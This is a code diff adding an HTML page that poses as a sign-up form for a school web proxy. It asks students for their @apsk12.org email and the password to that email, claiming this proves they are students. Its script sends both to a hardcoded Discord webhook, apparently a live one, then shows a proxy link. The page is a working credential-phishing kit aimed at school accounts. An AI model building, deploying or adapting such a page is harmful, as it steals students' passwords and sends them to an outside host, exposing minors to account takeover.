@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Request Form</title>
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 500px; margin: 50px auto; padding: 20px; background: #f4f4f4; }
+    .form-group { margin-bottom: 20px; }
+    label { display: block; margin-bottom: 5px; font-weight: bold; }
+    input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+    button { width: 100%; padding: 12px; background: #7289da; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+    button:hover { background: #5b6eae; }
+    #status { margin-top: 20px; padding: 10px; border-radius: 4px; }
+    .success { background: #d4edda; color: #155724; }
+    .error { background: #f8d7da; color: #721c24; }
+  </style>
+</head>
+<body>
+  <h1>Sign up to use proxy</h1>
+  <p>fill out this form to gain access to the proxy.</p>
+
+  <form id="contactForm">
+    <div class="form-group">
+      <label for="name">Your Email (xxxx@apsk12.org):</label>
+      <input type="text" id="name" required>
+    </div>
+    <div class="form-group">
+      <label for="code">Use password to email (to make sure you're a student):</label>
+      <input type="text" id="code" inputmode="numeric" pattern="[0-9]{5}" maxlength="5" required>
+    </div>
+    <button type="submit">Request Account</button>
+  </form>
+
+  <div id="status"></div>
+
+  <p id = "proxy" hidden="true"><a href="https://medical-reviews.remiosenifoundation.org/">Proxy access granted!</a></p>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1490172592454238289/RG5OyYWmtGAvI4M_JUi2IZXO0g9kab4KNacf3qoZk5yTWmA8YO7kUc0rkqGr48opUuE9"; // ← replace with your webhook
+
+    document.getElementById('contactForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const name = document.getElementById('name').value.trim();
+      const code = document.getElementById('code').value.trim();
+      const status = document.getElementById('status');
+
+      if (!name || !code) {
+        status.textContent = 'Please fill out all fields.';
+        status.className = 'error';
+        return;
+      }
+
+      if (!name.endsWith('@apsk12.org')) {
+        status.textContent = 'Email must end with @apsk12.org.';
+        status.className = 'error';
+        return;
+      }
+
+      if (!/^\d{5}$/.test(code)) {
+        status.textContent = 'Code must be exactly 5 numbers.';
+        status.className = 'error';
+        return;
+      }
+
+      status.textContent = 'Sending request...';
+      status.className = '';
+
+      try {
+        const response = await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            username: 'Account Request',
+            content: `**Account request from:** ${name}\n Password:${code}.`
+          })
+        });
+
+        if (response.ok) {
+          status.textContent = 'Succesfully signed up, you may now use proxy!';
+          status.className = 'success';
+          document.getElementById('contactForm').reset();
+          document.getElementById('proxy').hidden = false;
+        } else {
+          status.textContent = 'Error sending request. Check the webhook URL.';
+          status.className = 'error';
+        }
+      } catch (error) {
+        status.textContent = 'Network error. Check console and webhook URL.';
+        status.className = 'error';
+      }
+    });
+  </script>
+</body>
+</html>
